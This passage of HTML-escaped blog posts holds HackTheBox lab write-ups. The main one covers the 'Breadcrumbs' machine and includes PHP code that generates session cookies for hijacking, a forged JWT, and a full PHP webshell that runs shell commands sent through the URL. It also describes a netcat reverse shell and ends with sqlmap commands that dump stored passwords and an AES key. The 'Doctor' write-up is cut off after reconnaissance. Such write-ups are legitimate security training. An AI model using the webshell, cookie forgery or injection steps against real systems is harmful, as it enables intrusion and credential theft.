            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con-&amp;gt;prepare&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -&amp;gt;bind_param('ss', &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);

            if (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt-&amp;gt;execute&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;()){
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con-&amp;gt;insert_id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
                header('Location: login.php');
            }
            else{
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION['loggedIn']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = false;
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$errors['db_error']&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Database error: failed to register&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;
            }
        }
    }
} ?&amp;gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-authController.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We recover the key from cookie.php to generate PHPSESSID: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s4lTy_stR1nG_&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
\/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = \&quot;s4lTy_stR1nG_\&quot;.$username[$seed].\&quot;(!528.\/9890\&quot;;
    $session_cookie = $username.md5($key);

    return $session_cookie;
} 
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-lfi-cookie.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
&lt;h2 id=&quot;cookie-hijacking&quot;&gt;Cookie Hijacking&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;To get into the target, we use Cookie Hijacking method on Paul session.&lt;/p&gt;

&lt;p&gt;I test with my user to understand how PHPSESSID is generated and adapt the php script to show me all value of PHPSESSID:&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&quot;https://www.unphp.net/decode/61dd1e1d6f02265102ec45fb408016c0/&quot;&gt;https://www.unphp.net/decode/61dd1e1d6f02265102ec45fb408016c0/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;privuser45&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rota&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
  &lt;span class=&quot;nv&quot;&gt;$seed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s4lTy_stR1nG_&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(!528./9890&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$session_cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rota&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$session_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$rota&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rota&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid-test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We test now with user Paul and get 4 values of PHPSESSID. Only 1 is good reference of active session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-phpsessid.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To finalize the action, we generate the JWT token from jwt.io site with the secret_key:&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf&quot;&gt;https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jwt.io/&quot;&gt;https://jwt.io/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.codementor.io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m&quot;&gt;https://www.codementor.io/@byjg/using-json-web-token-jwt-as-a-php-session-axeuqbg1m&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-token.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to test now all PHPSESSID with token and the good one is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paul47200b180ccd6835d25d034eeb6e6390&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;So we have the following ID Session of Admin Paul: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-cookie-test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;uploading-webshell-and-tool&quot;&gt;Uploading webshell and tool&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;We have now privilege to upload on website, with only zip restriction. I test to upload webshell with .html extension and change it to .php into burp.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;form method=&quot;GET&quot; name=&quot;&amp;lt;?php echo basename($&lt;/span&gt;_SERVER[&lt;span class=&quot;s1&quot;&gt;'PHP_SELF'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;&amp;lt;?php
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;    if(isset($&lt;/span&gt;_GET[&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;    {
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;        system($&lt;/span&gt;_GET[&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;    }
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;document.getElementById&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.focus&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;span class=&quot;gp&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-upload-webshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And it’s work, we have possibility now from uploads path to test if webshell works.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-webshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I decide to upload nc.zip and extract with powershell command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-nc.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;get-reverse-shell&quot;&gt;Get reverse shell&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Execute command to get a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-revshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;lateral-movement&quot;&gt;Lateral Movement&lt;/h1&gt;
&lt;h2 id=&quot;enumeration-and-find-plaintext-password-of-juliette&quot;&gt;Enumeration and find plaintext Password of Juliette&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-jsonfile.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recover-sqlite-db-of-sticky-notes-app-and-find-plaintext-password-of-developpement&quot;&gt;Recover Sqlite db of Sticky Notes App and find plaintext Password of Developpement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;We get interesting note from Juliette workspace: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;It stores passwords in plain text&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sticky-notes-passwords&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#sticky-notes-passwords&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-notes.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download db of the stiky note and retrieve plaintext passowrd of Juliette and Developpement.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;scp juliette@10.10.10.228:/C:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-stickynotes-db.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;check-krypter_linux&quot;&gt;Check Krypter_Linux&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-prog.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Krypter_Linux is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELF 64-bit LSB pie executable&lt;/code&gt;, so i decide to reverse with gbd but no success …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-reverse-prog.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Check with strings command reveal interesting information about future release and features. And link reference of Password Manager &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://passmanager.htb:1234/index.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-check-prog.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Local box listen on this port, so we need to use ssh tunneling / local port forwarding to see and request with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method=select&amp;amp;username=administrator&amp;amp;table=passwords&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-check-1234.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
&lt;h2 id=&quot;sql-injection-in-password-manager&quot;&gt;SQL Injection in Password Manager&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; juliette 10.10.10.228 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 1234:127.0.0.1:1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-tunneling-test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;cURL command with method reveal AES_Key.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;'http://passmanager.htb:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Show all columns of table passwords in database bread:&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sqlmap &lt;span class=&quot;s1&quot;&gt;'http://passmanager.htb:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--columns&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dump values of columns accounts, aes_key, id and password for administrator:&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sqlmap &lt;span class=&quot;s1&quot;&gt;'http://passmanager.htb:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; account,aes_key,id,password &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-injectionsql-3.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-decrypt.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/breadcrumb/HTB-Images-Breadcrumb-flag-root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="Windows" /><category term="hard" /><category term="Fuzzing" /><category term="Cookie Hijacking" /><category term="JSON Web Token (JWT)" /><category term="Local File inclusion" /><category term="Sticky Notes App" /><category term="SQL Injection" /><summary type="html">Breadcrumbs is a vulnerable machine through : Foothold &amp;gt; Cookie Hijacking from LFI in php files Lateral movement &amp;gt; Reusing credentials plaintext Privilege Escalation &amp;gt; SQL Injection in Password Manager `</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/breadcrumb/HTB-Badge-Breadcrumb.png" /><media:content medium="image" url="/assets/images/breadcrumb/HTB-Badge-Breadcrumb.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Doctor Machine</title><link href="/posts/HTB-18-Pentest-Doctor/" rel="alternate" type="text/html" title="Write-up Doctor Machine" /><published>2021-02-04T20:00:00+01:00</published><updated>2021-02-04T20:00:00+01:00</updated><id>/posts/HTB-18-Pentest-Doctor</id><content type="html" xml:base="/posts/HTB-18-Pentest-Doctor/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-18-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Doctor is a vulnerable machine through :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Foothold : Server Side Template Injection&lt;/li&gt;
  &lt;li&gt;Lateral movement : Credential in log file&lt;/li&gt;
  &lt;li&gt;Prives : Abusing Splunk Forwarder&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have the 3 following open ports : 22, 80, 8089&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website-on-port-80&quot;&gt;Website on port 80&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.209/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-website.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;docteur-secure-messaging-on-port-80&quot;&gt;Docteur Secure Messaging on port 80&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Other page can be resolve with doctors.htb:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://doctors.htb/login?next=%2F
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-secure-messaging.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;splunk-forwarder-on-port-8089&quot;&gt;Splunk Forwarder on port 8089&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://doctors.htb:8089/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-splunk-forwarder.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-weaponization---find-exploit-way&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Weaponization - Find exploit way&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;archive-page-under-beta-testing&quot;&gt;Archive page under beta testing&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Reference: &lt;a href=&quot;https://portswigger.net/web-security/server-side-template-injection&quot;&gt;https://portswigger.net/web-security/server-side-template-injection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Source page reveal page under beta testing:&lt;/p&gt;

